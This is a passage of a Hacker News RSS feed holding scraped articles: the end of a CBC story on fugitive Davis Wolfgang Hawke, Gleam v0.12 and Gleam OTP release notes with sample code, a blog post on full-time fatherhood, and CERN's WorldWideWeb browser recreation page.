hunted Hawke for years, and learned he'd escaped the&nbsp;U.S. by sneaking on board fishing trawlers, spending time in Belize.</p>  <p>After warrants for his arrest expired, the search wound down.&nbsp;But Hawke kept living like a fugitive and never returned home, according to his family.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.4172626.1498106495!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/ihit-truck-stock.jpg 300w,https://i.cbc.ca/1.4172626.1498106495!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/ihit-truck-stock.jpg 460w,https://i.cbc.ca/1.4172626.1498106495!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/ihit-truck-stock.jpg 620w,https://i.cbc.ca/1.4172626.1498106495!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ihit-truck-stock.jpg 780w,https://i.cbc.ca/1.4172626.1498106495!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/ihit-truck-stock.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4172626.1498106495!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ihit-truck-stock.jpg"></p></div><figcaption>A stock photo of a 2000 red GMC Yukon XL, the same type of vehicle where the body of Hawke was found.<!-- --> <!-- -->(IHIT)</figcaption></figure></span></p>  <p>McWilliams said he always wondered if Hawke would settle down one day and "sell insurance," but said, "It sounds like he stayed kind of a wild man."</p>  <p>Hawke's uncle Raleigh Davis said his nephew's death was communicated to the family last week. He said nobody had seen Hawke in 20 years, and confirmation of his death at least offered some closure.</p>  <p>"He was really smart and really&nbsp;clever and really confident in a lot of ways.&nbsp;I think he had a really insecure side, though," said Davis.</p>  <p>"It's just sad."</p>  <p>Anyone with more information about Hawke's death is asked to phone IHIT&nbsp;at 1-877-551-4448&nbsp;or email ihitinfo@rcmp-grc.gc.ca&nbsp;or call Crime Stoppers at 1-800-222-8477&nbsp;if they want to remain anonymous.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5782109.1604017467!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/davis-wolfgang-hawke.jpg 300w,https://i.cbc.ca/1.5782109.1604017467!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/davis-wolfgang-hawke.jpg 460w,https://i.cbc.ca/1.5782109.1604017467!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/davis-wolfgang-hawke.jpg 620w,https://i.cbc.ca/1.5782109.1604017467!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/davis-wolfgang-hawke.jpg 780w,https://i.cbc.ca/1.5782109.1604017467!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/davis-wolfgang-hawke.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5782109.1604017467!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/davis-wolfgang-hawke.jpg"></p></div><figcaption>IHIT Sgt. Frank Jang holds a photo of Hawke.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/british-columbia/davis-wolfgang-hawke-missing-dead-1.5782107</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955454</guid>
            <pubDate>Sat, 31 Oct 2020 21:47:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Post-Truth]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24955452">thread link</a>) | @cjlm
<br/>
October 31, 2020 | https://roadtoramen.com/Day-299-Post-Truth-a90412603f5441bc9c6f22f1ee24dc69 | <a href="https://web.archive.org/web/*/https://roadtoramen.com/Day-299-Post-Truth-a90412603f5441bc9c6f22f1ee24dc69">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://roadtoramen.com/Day-299-Post-Truth-a90412603f5441bc9c6f22f1ee24dc69</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955452</guid>
            <pubDate>Sat, 31 Oct 2020 21:46:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Track lobbying spending by publicly-traded companies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24955377">thread link</a>) | @greatwave1
<br/>
October 31, 2020 | https://www.quiverquant.com/lobbyingsearch/ | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/lobbyingsearch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div>
			<ul>
				<li><a href="https://www.quiverquant.com/">Home</a></li>
				<li><a href="https://www.quiverquant.com/">Dashboard</a></li>
				<li>Lobbying Search</li>
			</ul>
			<ul>
				
				<li><a href="https://www.quiverquant.com/login"><img src="https://www.quiverquant.com/static/img/sign-in-icon.svg" alt="out"> Sign In</a></li>
				<li><a href="https://www.quiverquant.com/register"><img src="https://www.quiverquant.com/static/img/sign-up-icon.svg" alt="out"> Sign Up</a></li>
				
			</ul>
		</div>
		<div>
			
			<div>
				
				
				<div>
					<div>
						<div data-icon-bg="#57D7BA">
							<p><img src="https://www.quiverquant.com/static/img/mi-4.svg" alt="">
							</p>
							<h5>Lobbying Search</h5>
						</div>
					</div>
					<div>
						<p>
						<h6>Search lobbying by keyword:</h6></p>
						<form action="/lobbyingsearch/" method="post">
						
						
						
						</form>
					</div>
					<div>
						<p>
						<h6>Search lobbying by ticker:</h6></p>
						<form onsubmit="get_action(this);">
						
						
						</form>
					</div>
				</div>
				
				<div>
					<h3>OTHER DATASETS</h3>
					<div>

						<div>
							<div>
								<p><img src="https://www.quiverquant.com/static/img/mi-2.svg" alt="">
								</p>
								<div>
									<div>
										<h4>House Trading</h4>
										<p><span>Dashboard</span>
									</p></div>
								</div>
							</div>
						</div>

						<div>
							<div>
								<p><img src="https://www.quiverquant.com/static/img/plane-icon.svg" alt="">
								</p>
								<div>
									<div>
										<h4>Corporate Flights</h4>
										<p><span>Dashboard</span>
									</p></div>
								</div>
							</div>
						</div>

						<div>
							<div>
								<p><img src="https://www.quiverquant.com/static/img/mi-2.svg" alt="">
								</p>
								<div>
									<div>
										<h4>Insider Trading</h4>
										<p><span>Dashboard</span>
									</p></div>
								</div>
							</div>
						</div>
					</div>
				</div>
				

			</div>

		</div>
		
		
		
		
		<!-- modals -->
		
		<div id="login__window">
			
			<div>
				<div>
					<form action="">
						<h3>TRADE SMARTER</h3>
						<span>with our free, cutting-edge alternative data platform</span>
						<p>
							<span>Please enter user name</span>
						</p>
						<p>
							<span>Password to short</span>
						</p>
						
						<div><p>Don't have an account? <a href="#register__window">Sign Up for Free</a></p></div>
					</form>
				</div>
			</div>
		</div>
		
		
		<div id="register__window">
			
			<div>
				<div>
					<form action="">
						<h3>TRADE SMARTER</h3>
						<span>with our free, cutting-edge alternative data platform</span>
						<p>
							<span>Please enter user name</span>
						</p>
						<p>
							<span>Please enter valid email</span>
						</p>
						<p>
							<span>Password to short</span>
						</p>
						<p>
							<span>Password to short</span>
						</p>
						
						<p>I already have an account, <a href="#login__window">Sign In</a></p>
					</form>
				</div>
			</div>
		</div>
		
		
			
		
			
			
			
			
		
		
	</div></div>]]>
            </description>
            <link>https://www.quiverquant.com/lobbyingsearch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955377</guid>
            <pubDate>Sat, 31 Oct 2020 21:34:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gleam v0.12 and Gleam OTP v0.1 released]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24955229">thread link</a>) | @lpil
<br/>
October 31, 2020 | https://gleam.run/news/gleam-v0.12-and-gleam-otp-v0.1-released/ | <a href="https://web.archive.org/web/*/https://gleam.run/news/gleam-v0.12-and-gleam-otp-v0.1-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <article>
<p>It’s halloween and time for another Gleam release! This time it’s an extra
special release as it also includes the first version of <a href="https://github.com/gleam-lang/otp">Gleam’s type safe
actor system</a>, compatible with Erlang’s OTP.</p>

<h2 id="mutual-recursion">Mutual recursion</h2>

<p>Historically functions in Gleam had to be defined in a module prior to being used.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>helper</span><span>()</span> <span>// Compile error! Function `helper` not found</span>
<span>}</span>

<span>fn</span> <span>helper</span><span>()</span> <span>{</span>
  <span>0</span>
<span>}</span>
</code></pre></div></div>

<p>This has proven to be an annoyance as even though our code <em>should</em> compile
(all the required functions have been defined in the module) the compiler
won’t succeed unless we carefully maintain a specific order of functions in
the module.</p>

<p>This limitation also forced the programmer to write any helper functions at
the top of the file, before the functions that make use of them. Many people
like to write their code in the opposite order with their entry-point at the
top (such as a <code>main</code> function), and then helper functions below. That way
the module reads top-to-bottom, introducing new functions in the order they
are used.</p>

<p>Lastly it also meant that two functions could not call each other, making
useful techniques such as mutual recursion impossible.</p>

<p>With this release statements in a module can be written in any order, and
they still don’t require any type annotations to be fully type checked.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>barry</span><span>()</span> <span>{</span>
  <span>io</span><span>.println</span><span>(</span><span>"To you!"</span><span>)</span>
  <span>paul</span><span>()</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>paul</span><span>()</span> <span>{</span>
  <span>io</span><span>.println</span><span>(</span><span>"To me!"</span><span>)</span>
  <span>barry</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>That’s the only major change to the language this time. For a full list of
changes see the <a href="https://github.com/gleam-lang/gleam/blob/main/CHANGELOG.md#v0120-rc4---2020-10-31.">compiler changelog</a>.</p>

<p>Next up, Gleam’s new type safe actor system!</p>

<h2 id="gleam-otp">Gleam OTP</h2>

<p>Gleam’s actor system is built with a few primary goals:</p>

<ul>
  <li>Full type safety of actors and messages.</li>
  <li>Be compatible with Erlang’s OTP actor framework.</li>
  <li>Provide fault tolerance and self-healing through supervisors.</li>
  <li>Have equivalent performance to Erlang’s OTP.</li>
</ul>

<p>Two notable non-goals are that we are not explicitly supporting the BEAM’s
hot code upgrades, and we do not provide type safety for distributed
computing where two BEAM nodes on different computers send messages to each
other.</p>

<p>The core concepts of Gleam OTP are processes, channels, actors, and
supervisors. Let’s take a look at each of them.</p>

<h3 id="processes">Processes</h3>

<p>The core concurrency primitive in Gleam OTP is the process, which is a
lightweight green thread implemented by the BEAM virtual machine. These
processes are extremely cheap to create and run, and a single BEAM instance
can happily run millions of processes at the same time. It’s highly
sophisticated preemptive scheduler will ensure they make full use of all the
cores of the CPU, and no malicious or buggy process can block others from
running.</p>

<p>There’s a wealth of information online about the BEAM’s processes so we won’t
cover it all here, but know that Gleam’s actor system performs well thanks to
decades of excellent work by the Erlang community.</p>

<p>Use processes in Gleam we import the <a href="https://hexdocs.pm/gleam_otp/0.1.1/gleam/otp/process/"><code>gleam/otp/process</code></a> module which
provides functions for creating and working with them.</p>

<div><div><pre><code><span>import</span> <span>gleam</span><span>/</span><span>io</span>
<span>import</span> <span>gleam</span><span>/</span><span>otp</span><span>/</span><span>process</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>process</span><span>.start</span><span>(</span><span>fn</span><span>()</span> <span>{</span>
    <span>io</span><span>.println</span><span>(</span><span>"Hello from the new process!"</span><span>)</span>
  <span>})</span>

  <span>io</span><span>.println</span><span>(</span><span>"Hello from the parent process!"</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>In this code snippet we create a new process using the
<a href="https://hexdocs.pm/gleam_otp/0.1.1/gleam/otp/process/#start"><code>process.start</code></a> function, before printing a message to
the console.</p>

<p>The newly created process also prints a message, but because the two
processes run asynchronously (and likely run on different CPU cores) we don’t
know which will be printed first. It could be the new one first, or it could
be the parent, and it could be different each time the program runs.</p>

<p>One important thing to note is that there’s no need for an <code>async/await</code>
syntax or callbacks. Asynchronous code in Gleam looks exactly the same to
regular synchronous code and doesn’t require any special types such as
futures or promises.</p>

<p>This should hopefully feel familiar to people familiar with concurrent
programming in languages such as Erlang, Elixir, and Go.</p>

<h3 id="channels">Channels</h3>

<p>It’s not good enough to merely be able to create processes, we need processes
to be able to communicate and cooperate. Erlang and Gleam don’t have mutable
state so locks and shared mutable state is not an option- instead Gleam uses
channels.</p>

<p>Channels allow one process to send a message to another in a type safe
fashion, and they may be familiar to Go and Rust programmers.</p>

<p>A channel is made of a <a href="https://hexdocs.pm/gleam_otp/0.1.1/gleam/otp/process/#Sender"><code>Sender</code></a>, which messages as sent into,
and a <a href="https://hexdocs.pm/gleam_otp/0.1.1/gleam/otp/process/#Receiver"><code>Receiver</code></a>, which messages are pulled out of by the
channel owner process.</p>

<div><div><pre><code><span>import</span> <span>gleam</span><span>/</span><span>io</span>
<span>import</span> <span>gleam</span><span>/</span><span>otp</span><span>/</span><span>process</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>// Create a new channel owned by the current process</span>
  <span>let</span> <span>tuple</span><span>(</span><span>sender</span><span>,</span> <span>receiver</span><span>)</span> <span>=</span> <span>process</span><span>.new_channel</span><span>()</span>

  <span>process</span><span>.start</span><span>(</span><span>fn</span><span>()</span> <span>{</span>
    <span>io</span><span>.println</span><span>(</span><span>"Hello from the new process!"</span><span>)</span>
    <span>// Send a message to the parent process</span>
    <span>process</span><span>.send</span><span>(</span><span>sender</span><span>,</span> <span>"Done"</span><span>)</span>
  <span>})</span>

  <span>// Receive a message from the child, waiting up to 100ms</span>
  <span>process</span><span>.receive</span><span>(</span><span>receiver</span><span>,</span> <span>100</span><span>)</span> <span>// This returns Ok("Done")</span>
  <span>io</span><span>.println</span><span>(</span><span>"Hello from the parent process!"</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>Here the code has been updated to use a channel to coordinate the processes.
The parent process creates a channel and waits for the child to send a
message over the channel before printing. Because of this we know that the
child process will now always print to the console before the parent does.</p>

<p>Here we’re just using a simple string message to synchronize processes but
any type we want can be sent over channel, enabling sharing of data in
concurrent programs.</p>

<p>The Gleam compiler can full type check channels. Because the message sent
with the sender is a <code>String</code> the compiler knows messages pulled from the
receiver must also be strings and will print a helpful error with any program
that doesn’t use these messages correctly.</p>

<h3 id="actors">Actors</h3>

<p>In programs written in Erlang using OTP we tend to not use raw processes
frequently, instead we use a higher level abstraction called <code>gen_server</code>
that builds upon a process to provide additional features making it more
suited to being used in a long-lived Erlang application. Gleam is similar,
though our higher level abstraction is called <a href="https://hexdocs.pm/gleam_otp/0.1.1/gleam/otp/actor/"><code>actor</code></a> and
differs in design to <code>gen_server</code> in order to provide type safety.</p>

<div><div><pre><code><span>import</span> <span>gleam</span><span>/</span><span>io</span>
<span>import</span> <span>gleam</span><span>/</span><span>otp</span><span>/</span><span>actor</span>
<span>import</span> <span>gleam</span><span>/</span><span>otp</span><span>/</span><span>process</span><span>.</span><span>{</span><span>Sender</span><span>}</span>

<span>pub</span> <span>type</span> <span>Message</span> <span>{</span>
  <span>Request</span><span>(</span><span>reply_channel</span><span>:</span> <span>Sender</span><span>(</span><span>String</span><span>))</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>let</span> <span>actor</span> <span>=</span> <span>actor</span><span>.start</span><span>(</span><span>0</span><span>,</span> <span>handle_message</span><span>)</span>

  <span>// Send a message to the child and wait for a response</span>
  <span>process</span><span>.call</span><span>(</span><span>actor</span><span>,</span> <span>Request</span><span>,</span> <span>100</span><span>)</span> <span>// This returns Ok("Done")</span>
  <span>io</span><span>.println</span><span>(</span><span>"Hello from the parent process!"</span><span>)</span>
<span>}</span>

<span>fn</span> <span>handle_message</span><span>(</span><span>msg</span><span>:</span> <span>Message</span><span>,</span> <span>state</span><span>)</span> <span>{</span>
  <span>io</span><span>.println</span><span>(</span><span>"The actor got a message"</span><span>)</span>
  <span>process</span><span>.send</span><span>(</span><span>msg</span><span>.reply_channel</span><span>,</span> <span>"Done"</span><span>)</span>
  <span>actor</span><span>.Continue</span><span>(</span><span>state</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>Here the code has been adapted to use an actor rather than a low-level
process, and instead of explicitly creating a new channel we use the
<a href="https://hexdocs.pm/gleam_otp/0.1.1/gleam/otp/process/#call"><code>call</code></a> function. This function is similar to Erlang’s
<code>gen_server:call</code> in that it provides a way to send a message to a process
and then wait until a reply is received.</p>

<p>Since an actor is being used here rather than a raw process it doesn’t shut
down after running the function once, instead the handler function is called
once per message received and the actor continues to run until either it is
requested to shut down or it returns <code>actor.Stop</code> from its handler function.</p>

<p>Any of OTP’s debug or system messages sent to the actor are automatically
handled by the actor implementation, while they would need to be manually
handled when using a raw process.</p>

<h3 id="supervisors">Supervisors</h3>

<p>Supervisors are special actors that start other actors and then monitor them
to ensure they are healthy. If one of the children crashes the supervisor
restarts it along with any younger children, restoring the program to a
healthy state now that any transient problems have ended.</p>

<p>If the problem is not transient and the child continues to crash then the
supervisor will shut down and then the supervisor’s supervisor can attempt a
restart now that more possibly invalid or corrupt state has been reset.</p>

<p>By using this supervision functionality OTP applications can achieve high
reliability by shedding state in an incremental fashion until the program
self-heals. This is kind-of similar to how Kubernetes and other container
orchestrators handle failure in microservices, though faster and more precise
thanks to it being integrated at all levels of the program.</p>

<div><div><pre><code><span>import</span> <span>gleam</span><span>/</span><span>otp</span><span>/</span><span>supervisor</span><span>.</span><span>{</span><span>add</span><span>,</span> <span>returning</span><span>,</span> <span>worker</span><span>}</span>
<span>import</span> <span>my_app</span><span>/</span><span>monitoring</span>
<span>import</span> <span>my_app</span><span>/</span><span>database</span>
<span>import</span> <span>my_app</span><span>/</span><span>web</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>supervisor</span><span>.start</span><span>(</span><span>fn</span><span>(</span><span>children</span><span>)</span> <span>{</span>
    <span>children</span>
    <span>|</span><span>&gt;</span> <span>add</span><span>(</span><span>worker</span><span>(</span><span>database</span><span>.start</span><span>))</span>
    <span>|</span><span>&gt;</span> <span>add</span><span>(</span><span>worker</span><span>(</span><span>monitoring</span><span>.start</span><span>))</span>
    <span>|</span><span>&gt;</span> <span>add</span><span>(</span><span>worker</span><span>(</span><span>web</span><span>.start</span><span>))</span>
  <span>})</span>
<span>}</span>
</code></pre></div></div>

<p>Here we have a supervisor for a pretend Gleam web application. It has 3
children of the type <code>worker</code>, a database connection, an actor responsible
for monitoring, and a HTTP handling actor. If we were adding a supervisor
child we could use the <code>supervisor</code> function instead of <code>worker</code>.</p>

<h3 id="going-forward">Going forward</h3>

<p>Gleam OTP v0.1 is the result of approaching 2 years of research and
implementation, mostly focusing on how to strike a good balance between type
safety and compatibility with existing Erlang OTP patterns.</p>

<p>Rather than build on top of Erlang’s <code>supervisor</code> and <code>gen_server</code> Gleam OTP
has a small core written in Erlang which implements the <code>Receiver</code> half of
channels, and the rest is implemented in Gleam. Thanks to this we can have
greater confidence in the viability of the core abstractions as they have
been sufficient to implement the rest of Gleam OTP in a type safe fashion.</p>

<p>These APIs (particularly supervisor) are experimental and open to breaking
changes as we discover new ways to improve them, but we’ve reach a point
where we can start writing programs using it.</p>

<p>If you write something using Gleam OTP please do get in touch and let us know
how you find it!</p>

<h2 id="discord-chat">Discord chat</h2>

<p>Lastly, we’ve got a new home for the community! The Gleam IRC channel has
been replaced by the Gleam Discord chat server to great success. Since
opening we’ve seen a big increase in activity and lots of new exciting Gleam</p></article></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gleam.run/news/gleam-v0.12-and-gleam-otp-v0.1-released/">https://gleam.run/news/gleam-v0.12-and-gleam-otp-v0.1-released/</a></em></p>]]>
            </description>
            <link>https://gleam.run/news/gleam-v0.12-and-gleam-otp-v0.1-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955229</guid>
            <pubDate>Sat, 31 Oct 2020 21:12:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Full-time web developer vs. being a full-time dad]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24955205">thread link</a>) | @MattBearman
<br/>
October 31, 2020 | https://blog.mattbearman.com/web-developer-vs-full-time-dad/ | <a href="https://web.archive.org/web/*/https://blog.mattbearman.com/web-developer-vs-full-time-dad/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>For the last 13 years, I’ve been some form of professional web developer, and for the last 21 months, I’ve been a dad. We’re lucky enough that my salary means Sophie (my wife) is able to be a stay at home mum. We both love this arrangement, as we don’t need to sort out child care, and as I work remotely from home, our daughter gets to spend a lot of time with us.</p> <p><em><strong>Note:</strong> We decided before she was born that we didn’t want our daughter to have an online presence until she was old enough to decide for herself. This is why I won’t be referring to her by name. My apologies if that makes this a little awkward to read.</em></p> <p>In August this year, Sophie had to be rushed into hospital for life-saving surgery, which thankfully was successful. She did however have a long recovery period, so for two weeks after the surgery, I didn’t work.</p> <p>I spent that two weeks being a full time dad, carer, and house husband.</p> <p>Under normal circumstances, I work 9:00 to 5:00 Monday to Friday, while Sophie looks after our daughter and the house. Outside of those hours we share the housework and childcare. One downside to this is that Sophie gets to spend a lot more time one-to-one with our daughter than I do.</p> <p>However, during those first two weeks of Sophie’s recovery, I did all the childcare, and all the house work. My days started at 7:00am, and usually didn’t finish until 8:00pm, when we’d had dinner and I’d done the washing up. I’d get a couple of hours off in the afternoon when our daughter was napping, although that was often spent doing house work. And this was seven days a week.</p> <p>It was the longest days I’d ever worked, and by far the hardest job I’ve ever had. But it was also the most rewarding.</p> <p>This new routine also highlighted the effect my usual sedentary lifestyle was having on my health and fitness, as at the end of the first few days of being a full time dad, I’d lay down in bed with aching legs. I’d not done anything specifically strenuous on those days. Simply running round with a very active toddler all day was far more exertion than my puny legs were used to. It’s prompted me to get back into running, as well as look into setting up a sit/stand desk (I did have a standing desk for a while, but ultimately abandoned it. That’s s story for another post).</p> <p>I loved getting to spend so much time one on one with our daughter, and we definitely connected more. She’s such a joy to be around, at an age where she’s putting a lot of small, adorable, and often hilarious sentences together. This also means she is able to express how she feels, and even engage in something resembling a conversation.</p> <p>I also had a lot of learning to do, things like what washing machine setting to use when washing bedding, and how to time preparing our daughter’s meals. One of the most important lessons for me was learning more of her abilities, and just how much she is able to do now. As a result, I feel more at ease when she is experimenting and exploring. I’ve always been the more cautious parent, which I think is in part because I don’t spend as much time with our daughter, so I’m less aware of her capabilities.</p> <p>We also learned new ways of making each other laugh, which often ends up in a positive feedback loop turning from giggles into uncontrollable laughing fits.</p> <p>I enjoy programming, and I love my job, but at the end of those two weeks, when Sophie was feeling well enough to return to a more normal routine, I honestly didn’t want to go back to work.</p> <p>I feel incredibly lucky to be able to do the job I do. It’s physically easy (although often mentally exhausting), the pay is great, and I can do it from the comfort of my own home.</p> <p>That being said, if money wasn’t a factor, I’d chose being a full time dad every time. It’s the best job I ever had.</p> <p><em>– Matt</em></p> </div> </article> </div></div>]]>
            </description>
            <link>https://blog.mattbearman.com/web-developer-vs-full-time-dad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955205</guid>
            <pubDate>Sat, 31 Oct 2020 21:07:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Browser – WorldWideWeb Next Application (1990)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24955122">thread link</a>) | @mpweiher
<br/>
October 31, 2020 | https://worldwideweb.cern.ch/worldwideweb/ | <a href="https://web.archive.org/web/*/https://worldwideweb.cern.ch/worldwideweb/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    
<section>
	<h2>WorldWideWeb</h2>
	<div>
		<p>The idea of hypertext preceded the World Wide Web by decades. But nearly all hypertext systems worked on local files. Tim Berners-Lee wanted to create a system that would work across networks so that people could link from a file on one machine to another file on another machine.</p>
		<p>WorldWideWeb wasn't just a programme for browsing files. It was a browser and editor. The introductory text reads:</p>
		<blockquote>HyperMedia Browser/Editor, An excercise in global information availability by Tim Berners-Lee</blockquote>
		<p>Today it's hard to imagine that web browsers might also be used to create web pages. It turned out that people were quite happy to write HTML by hand—something that Tim Berners-Lee and colleagues never expected. They thought that some kind of user interface would be needed for making web pages and links. That's what the WorldWideWeb browser provided. You could open a document in one window and "mark" it. Then, in a document in another window, you could create a link to the marked page.</p>
		<p>You'll notice as you use the WorldWideWeb browser that you need to double-click links to open them. That's because a single click was used for editing.</p>
	</div>
</section>

<section>
	<h2>Browsing</h2>
	<div>
		<p>The user interface of the WorldWideWeb browser somewhat blurred the lines between documents on your own computer and documents out on the network. To "browse" directly to a document out on the network, you need to know its URL. But you can't simply type that URL into an address bar; there is no address bar. Instead you have to follow a sequence of steps:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "Document".</li>
			<li>Now from the newly-opened "Document" menu, select "Open from full document reference".</li>
			<li>Type the URL into the field marked "reference".</li>
			<li>Press the "Open" button</li>
		</ol>
		<p>Once you've got a web-based document (or web page, as we would say today) open in WorldWideWeb, you can navigate by double-clicking on links. Every link you double-click will open in a new window.</p>
	</div>
</section>

<section>
	<h2>Linking</h2>
	<div>
		<p>At its heart, WorldWideWeb is a word processor …but with links. And just as you <em>can</em> use a word processor purely for reading documents, the real fun comes when you write your own. Especially when you throw hyperlinks into the mix.</p>
		<p>To create a document:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "New File..."</li>
			<li>Type the name of the file you want to create e.g. example.html</li>
			<li>In the boilerplate document, click on the heading to edit. Same with the text.</li>
		</ol>
		<p>Once you've got a document written, it's time to turn from regular text into <em>hyper</em>text:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "Links"</li>
			<li>To link to another document, you need to have that other document open in another window. Click on its title bar to focus it.</li>
			<li>With that document in focus, select "Mark all" from the "Links" menu.</li>
			<li>Now switch back to your example.html document and highlight the text you want to be a link.</li>
			<li>From the "Links" menu, select "Link to marked".</li>
		</ol>
		<p>You can even save your new document on to your hard drive. Click on "Save a copy offline" under the "Documents" menu.</p>
		<p>Once you've downloaded the file to your computer, you can open it up with a text editor to see what the HTML would have looked like.</p>
	</div>
</section>

<section>
<h2>Editing</h2>
<div>
	<p>To edit any document, whether it's one you created, or a page on the world wide web:</p>
	<ol>
		<li>Click on the text you want edit.</li>
		<li>Edit it.</li>
	</ol>
	<p>That's it.</p>
	<p>If you want to keep a copy of the edited document, choose "Save a copy offline" from the "Documents" menu.</p>
	</div>
</section>

<section>
	<h2>Components</h2>
	<p>Here is a collection of HTML-based components recreating the original NeXT interface. Feel free to grab, view-source, etc, to use for your own projects. </p>
	<section>
		<h3 id="#palette-section">Color Palette</h3>

		
	</section>

	<section>
		<h3 id="form-section">Form Elements</h3>

		<h4>Inputs</h4>
		<p><label>A label </label></p>
		<h4>Fieldsets</h4>
		
	</section>

	<section>
		<h3 id="buttons-section">Buttons</h3>
		<p>In the case of buttons, there's no standard for paddings. The button must
				match the width/height of the parent, so all buttons of the same group are of the
				same width/height.</p>

		<h4>Simple button</h4>
		
		<h4>Image Buttons</h4>
		
	</section>

	<section>
		<h3 id="panels-section">Panels</h3>
		<p>Width and height properties must be defined locally.</p>
		<div>
			<div>
				
				<p>Content goes here; it can be a webview, group of buttons, forms...</p>
			</div>

			<div>
				
				<p>Content goes here; it can be a webview, group of buttons, forms...</p>
			</div>
		</div>
	</section>

	<section>
		<h3 id="webview-section">WebView</h3>
		<p>Width and height properties must be defined locally.</p>
		<div>
			<div>
				<div>
					<div>
						<p><a href="#">Omnia sol temperat</a>
								Purus et subtilis<br>
								Novo mundo reserat<br>
								Faciem Aprilis<br>
								Ad amorem properat<br>
								Animus herilis<br>
								Et iocundis imperat<br>
								Deus puerilis<br>
								Et iocundis imperat<br>
								Deus puerilis</p>
							<p>Ama me fideliter<br>
								Fidem meam nota<br>
								De corde totaliter<br>
								Et Ex mente tota<br>
								Ama me fideliter<br>
								Fidem meam nota<br>
								De corde totaliter<br>
								Et Ex mente tota</p>

							<p>Rerum tanta novitas<br>
								In sollmenti vere<br>
								Et veris auctoritas<br>
								Iubet nos gaudere<br>
								Vices prebet solitas<br>
								Et in tuo vere<br>
								Fides est et probitas<br>
								Tuum retinere<br>
								Fides est et probitas<br>
								Tuum retinere</p>
					</div>
				</div>
				</div>
		</div>
	</section>

	<section>
		<h3 id="nav-section">Floating Menus</h3>
		
	</section>

	<section>
		<h3 id="general-section">General UI Elements</h3>
		<h4>Divisions</h4>
		
	</section>

	<section>
		<h3 id="open-url-section">Open URL</h3>
		<div>
			<div id="open-url">
				<div>
					<h3>Open using hypertext reference</h3>
					</div>
				
			</div>
		</div>
	</section>

	<section>
			<h3 id="navigation-section">Browser Navigation</h3>
			
	</section>

	<section>
			<h3 id="info-section">Info Dialog</h3>
			<div>
				<div id="browser-info">
					
					<div>
						<header>
							<p><img src="https://worldwideweb.cern.ch/images/ui-patterns/wwwicon.png" alt=""></p>
							<div>
								<h4>HyperMedia Browser/Editor</h4>
								<p>An excercise in global information availability</p>
							</div>
							<p>Version 1.0<br>Alpha only</p>
							<address>by Tim Berners-Lee</address>
						</header>
						<hr>
						<div>
							<p>Copyright 1990, 91
									<span>Distribution restricted: ask for terms.</span>
									<span>TEST VERSION ONLY</span></p>
							<dl>
								<p>
									<dt>HyperText:</dt>
